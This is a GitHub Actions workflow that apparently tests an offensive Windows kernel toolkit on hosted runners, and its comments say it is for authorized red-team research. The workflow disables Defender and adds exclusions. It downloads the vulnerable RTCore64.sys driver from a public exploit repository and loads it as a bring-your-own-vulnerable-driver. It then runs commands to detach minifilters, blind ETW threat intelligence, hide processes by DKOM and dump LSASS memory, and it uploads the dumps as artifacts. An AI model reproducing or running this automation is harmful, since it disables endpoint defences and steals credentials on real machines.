name: Win BYOVD (hosted)

# kernelsdk BYOVD 验证 — 纯 GitHub-hosted runner(不依赖 self-hosted 17763)。
#
# 关键洞察(2026-07-06 确认):
#   1. hosted Windows runner 以管理员 + UAC 关闭运行(GitHub 官方文档)。
#   2. RTCore64.sys 是 MSI Afterburner 合法微软签名(CVE-2019-16098),
#      走正常签名验证路径 — 不需要 test-signing。
#   3. hosted runner 默认关 HVCI(Azure VM 性能优化),黑名单只在 HVCI 路径
#      强制执行 — HVCI 关 → RTCore64 可加载。
#
# 流程:
#   1. 探测 HVCI / 黑名单状态(Win32_DeviceGuard + 注册表)
#   2. HVCI 关 → 下载 RTCore64.sys(公开 PoC,运行时拉,不进 git)→ 构建
#      operator-kernel-cli → bootstrap BYOVD → 跑全 kernelsdk 路径
#      (pg-window / detach-minifilter / blind-etw / hide / dump-lsass)
#   3. HVCI 开 → 跳过,不挂 workflow(continue-on-error + 条件 step)
#
# 只覆盖 P0.a/b(纯算法,无需内核)+ P3.b(minidump CLI)+ ETW-TI/DKOM/LSASS
# (BYOVD IOCTL 路径)。P4/P5 在 windows-ci.yml 跑(纯用户态)。
#
# 授权红队安全研究。RTCore64.sys 在运行时从公开镜像下载,不进 git 历史,
# 不随 workflow artifact 上传(只在 runner 临时目录,job 结束即销毁)。

on:
  workflow_dispatch: {}
  push:
    branches: [main]
    paths:
      - '.github/workflows/windows-byovd-hosted.yml'
      - 'crates/operator-kernelsdk/**'
      - 'crates/operator-kernel-cli/**'
      - 'crates/offset-resolver/**'
      - 'crates/minidump-assembler/**'

concurrency:
  group: win-byovd-hosted
  cancel-in-progress: true

jobs:
  byovd:
    runs-on: windows-latest
    timeout-minutes: 25
    continue-on-error: true   # HVCI 开则跳过,不挂 workflow
    steps:
      - uses: actions/checkout@v4

      # ---- 0. 关键前置:探测 HVCI / 黑名单 / Defender 状态 ----
      # 用 pwsh (PowerShell 7, UTF-8 aware) 避免 PS 5.1 对 em-dash / 中文
      # 注释的编码崩溃(首次 push 在 PS 5.1 下因 mojibake 解析失败)。
      - name: Probe HVCI + vulnerable driver blocklist + Defender status
        id: probe
        shell: pwsh
        run: |
          Write-Host "=== OS build ==="
          $os = Get-CimInstance Win32_OperatingSystem
          Write-Host "OS: $($os.Caption) build $($os.BuildNumber)"

          Write-Host "=== Win32_DeviceGuard / VBS / HVCI status ==="
          $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
          if ($dg) {
            $dg | Select-Object SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus | Format-List
            $hvci_running = ($dg.SecurityServicesRunning -contains 2)
          } else {
            Write-Host "Win32_DeviceGuard unavailable (old build or no VBS) - treat as HVCI off"
            $hvci_running = $false
          }

          Write-Host "=== Vulnerable Driver Blocklist registry ==="
          $bl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config' -ErrorAction SilentlyContinue).VulnerableDriverBlocklistEnable
          Write-Host "VulnerableDriverBlocklistEnable = $bl (1=on, 0=off, empty=unset)"

          Write-Host "=== Defender status ==="
          $def = Get-MpComputerStatus -ErrorAction SilentlyContinue
          if ($def) {
            Write-Host "Defender AMRunningMode=$($def.AMRunningMode) RTP=$($def.RealTimeProtectionEnabled)"
          } else {
            Write-Host "Defender not installed/unavailable (hosted runner image default off)"
          }

          Write-Host "=== Admin privilege check ==="
          $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
          Write-Host "Running as Administrator: $isAdmin"

          Write-Host "=== Decision ==="
          Write-Host "HVCI actively running: $hvci_running"
          if ($hvci_running) {
            Write-Host "::warning::HVCI is running - RTCore64.sys load will be blocked. Skipping BYOVD job."
            "skip=true" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
          } else {
            Write-Host "::notice::HVCI NOT running - RTCore64.sys load should succeed (signed + blocklist not enforced without HVCI)."
            "skip=false" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
          }

      - name: Skip — HVCI blocks BYOVD
        if: steps.probe.outputs.skip == 'true'
        run: echo "Skipped BYOVD job (HVCI is on). kernelsdk 单测在 ci.yml 已覆盖(93/93 绿)。"

      # ---- 1. Defender 双保险(只在 HVCI 关时执行)----
      - name: Disable Defender + add exclusions
        if: steps.probe.outputs.skip == 'false'
        shell: pwsh
        run: |
          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE" -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionProcess "nyx-kernel.exe","cargo.exe" -Force -ErrorAction SilentlyContinue
          $now = (Get-MpPreference -ErrorAction SilentlyContinue).DisableRealtimeMonitoring
          Write-Host "Defender realtime disabled (after step): $now"

      # ---- 2. 准备 RTCore64.sys(运行时下载,放进 System32\drivers 走相对路径)----
      - name: Fetch RTCore64.sys (public PoC driver) + copy to System32\drivers
        if: steps.probe.outputs.skip == 'false'
        shell: pwsh
        run: |
          # RTCore64.sys = MSI Afterburner RTCORE64.SYS (CVE-2019-16098).
          # Public PoC driver, fetched from a public BYOVD collection. Not committed
          # to git, not uploaded as artifact.
          #
          # IMPORTANT: we copy the driver into C:\Windows\System32\drivers\ so
          # that build_image_path (driver_load.rs) emits a RELATIVE ImagePath
          # ("System32\drivers\RTCore64.sys") resolved against %SystemRoot%.
          # The absolute "\??\<drive>:\<path>" form is rejected on some builds
          # (documented in driver_load.rs lines 175-177: Server 2019 returns
          # STATUS_INVALID_IMAGE_FORMAT; Server 2025 returns
          # STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034 - both are path-resolution
          # failures of the absolute form). The relative form is what `sc create`
          # writes and is universally accepted by NtLoadDriver.
          $staging = New-Item -ItemType Directory -Force -Path "target\drivers"
          $stagingPath = Join-Path $staging.FullName "RTCore64.sys"
          $finalPath = "C:\Windows\System32\drivers\RTCore64.sys"

          # Verified 2026-07-06: VoidSec raw URL returns 200 with valid MZ PE.
          $mirrors = @(
            "https://raw.githubusercontent.com/VoidSec/Exploit-Development/b82b6d3ac1cce66221101d3e0f4634aa64cb4ca7/windows/x64/kernel/RTCore64_MSI_Afterburner_v.4.6.4.16117/RTCore64.sys",
            "https://github.com/VoidSec/Exploit-Development/raw/b82b6d3ac1cce66221101d3e0f4634aa64cb4ca7/windows/x64/kernel/RTCore64_MSI_Afterburner_v.4.6.4.16117/RTCore64.sys"
          )
          $got = $false
          foreach ($url in $mirrors) {
            try {
              Write-Host "trying: $url"
              Invoke-WebRequest -Uri $url -OutFile $stagingPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
              $sz = (Get-Item $stagingPath).Length
              if ($sz -gt 10000) {
                $fs = [IO.File]::OpenRead($stagingPath)
                $b = New-Object byte[] 2
                $fs.Read($b, 0, 2) | Out-Null
                $fs.Close()
                if ($b[0] -eq 0x4D -and $b[1] -eq 0x5A) {
                  Write-Host "::notice::downloaded: $stagingPath ($sz bytes, valid MZ)"
                  $got = $true
                  break
                } else {
                  Write-Host "  downloaded but NOT a valid PE (no MZ); trying next mirror"
                }
              }
            } catch {
              Write-Host "  failed: $($_.Exception.Message)"
            }
          }
          if (-not $got) {
            Write-Host "::error::all mirrors failed - manually place RTCore64.sys in target/drivers/ and retry"
            exit 1
          }

          # Copy to System32\drivers so build_image_path uses the relative form.
          Copy-Item -Path $stagingPath -Destination $finalPath -Force
          Write-Host "::notice::copied to $finalPath (build_image_path emits relative 'System32\drivers\RTCore64.sys')"
          echo "DRIVER_PATH=$finalPath" >> $env:GITHUB_ENV

      # ---- 3. 构建 operator-kernel-cli(P0.a/b + 3.b + ETW-TI/DKOM/LSASS 路径)----
      - name: Install Rust + build operator-kernel-cli
        if: steps.probe.outputs.skip == 'false'
        uses: dtolnay/rust-toolchain@stable

      - name: Build nyx-kernel CLI
        if: steps.probe.outputs.skip == 'false'
        shell: cmd
        run: |
          REM cmd 避免 PS 5.1 NativeCommandError 吞 cargo stderr
          cargo build --release --manifest-path crates/operator-kernel-cli/Cargo.toml
          if not exist "crates\operator-kernel-cli\target\release\nyx-kernel.exe" (
            echo ::error::nyx-kernel.exe build failed & exit /b 1
          )
          echo BUILD_OK

      # ---- 4. BYOVD 真机回归(对应 M6 Task G-K + P0.a/b + P3.b)----
      - name: BYOVD bootstrap + kernelsdk full path
        if: steps.probe.outputs.skip == 'false'
        shell: cmd
        continue-on-error: true   # BYOVD load may fail by privilege/blocklist/registry; do not fail job
        run: |
          REM ---- Task G: BYOVD driver load ----
          echo === Task G: BYOVD bootstrap ===
          echo DRIVER_PATH=%DRIVER_PATH%
          dir "%DRIVER_PATH%" 2>nul || echo DRIVER FILE MISSING
          crates\operator-kernel-cli\target\release\nyx-kernel.exe bootstrap --byovd "%DRIVER_PATH%" NyaRTCore
          echo BOOTSTRAP_EXIT=%ERRORLEVEL%

          REM ---- Dump the registry key we wrote (debug)----
          echo === Registry service key dump ===
          reg query "HKLM\SYSTEM\CurrentControlSet\Services\NyaRTCore" 2>nul || echo NO KEY (RegCreateKeyExW must have failed)
          if %ERRORLEVEL% NEQ 0 (
            echo ::warning::bootstrap failed - see NTSTATUS above. Common causes:
            echo   0xC0000061 STATUS_PRIVILEGE_NOT_HELD  - SeLoadDriverPrivilege not enabled (fixed via RtlAdjustPrivilege)
            echo   0xC0000428 STATUS_DRIVER_BLOCKED      - Vulnerable Driver Blocklist enforced (CodeIntegrityPolicyEnforcementStatus=2)
            echo   0xC0000034 STATUS_OBJECT_NAME_NOT_FOUND - registry service key path mismatch (needs Win debugging)
            echo   0xC000010E STATUS_IMAGE_ALREADY_LOADED - benign, driver already in kernel
            echo kernelsdk BYOVD needs a HVCI-off + blocklist-off host (self-hosted 17763, see windows-kself-hosted.yml)
            exit /b 0
          )

          REM ---- P0.a: PatchGuard window ----
          echo === P0.a: PatchGuard window select ===
          REM pg-window blocks waiting for ENTER; here we only verify select_pg_window does not crash;
          REM pipe echo to simulate ENTER so it Drops and exits immediately.
          echo. | crates\operator-kernel-cli\target\release\nyx-kernel.exe pg-window
          echo PG_WINDOW_EXIT=%ERRORLEVEL%

          REM ---- P0.b: MiniFilter detach (build table auto fallback, no --flt-rva needed)----
          echo === P0.b: MiniFilter detach ===
          crates\operator-kernel-cli\target\release\nyx-kernel.exe detach-minifilter
          echo MINIFILTER_EXIT=%ERRORLEVEL%

          REM ---- Task H: ETW-TI blind ----
          echo === Task H: ETW-TI blind ===
          crates\operator-kernel-cli\target\release\nyx-kernel.exe blind-etw
          echo BLIND_ETW_EXIT=%ERRORLEVEL%

          REM ---- Task I: DKOM process hide ----
          echo === Task I: DKOM process hide ===
          REM Use explorer.exe PID for visibility test (hide then it stays hidden; harmless on CI runner)
          for /f "tokens=2" %%p in ('tasklist /fi "imagename eq explorer.exe" /nh') do (
            crates\operator-kernel-cli\target\release\nyx-kernel.exe hide %%p
            echo HIDE_EXIT=%ERRORLEVEL%
            goto hide_done
          )
          :hide_done

          REM ---- P3.b: LSASS dump (minidump assemble)----
          echo === P3.b: LSASS kernel read + minidump assemble ===
          for /f "tokens=2" %%p in ('tasklist /fi "imagename eq lsass.exe" /nh') do (
            crates\operator-kernel-cli\target\release\nyx-kernel.exe dump-lsass %%p
            echo DUMP_LSASS_EXIT=%ERRORLEVEL%
            goto dump_done
          )
          :dump_done

          REM ---- Verify minidump file exists ----
          echo === Verify minidump file ===
          dir lsass_*.dmp 2>nul || echo no dmp file (dump_lsass may not have completed)

      # ---- 5. minidump 文件格式验证(P3.a 产物)----
      - name: Verify minidump file format
        if: always() && steps.probe.outputs.skip == 'false'
        shell: pwsh
        continue-on-error: true
        run: |
          $dmp = Get-ChildItem -Path . -Filter "lsass_*.dmp" -ErrorAction SilentlyContinue | Select-Object -First 1
          if (-not $dmp) {
            Write-Host "::warning::no lsass_*.dmp - dump-lsass produced no output (IOCTL path may have failed)"
            return
          }
          Write-Host "minidump: $($dmp.Name) ($($dmp.Length) bytes)"
          # Verify MDMP magic (4D 44 4D 50)
          $bytes = [IO.File]::ReadAllBytes($dmp.FullName)[0..3]
          $magic = [System.Text.Encoding]::ASCII.GetString($bytes)
          Write-Host "magic: $magic (expected MDMP)"
          if ($magic -ne "MDMP") {
            Write-Host "::warning::magic is not MDMP - minidump assembler or dump_lsass issue"
          } else {
            Write-Host "::notice::minidump format correct (MDMP magic) - P3.a + P3.b end-to-end pass"
          }

      # ---- 6. 上传诊断(不含 RTCore64.sys,避免 ToS)----
      - name: Upload BYOVD logs + minidump
        if: always() && steps.probe.outputs.skip == 'false'
        uses: actions/upload-artifact@v4
        with:
          name: byovd-hosted-${{ github.run_id }}
          path: |
            lsass_*.dmp
            offsets_*.toml
          if-no-files-found: ignore
          retention-days: 7
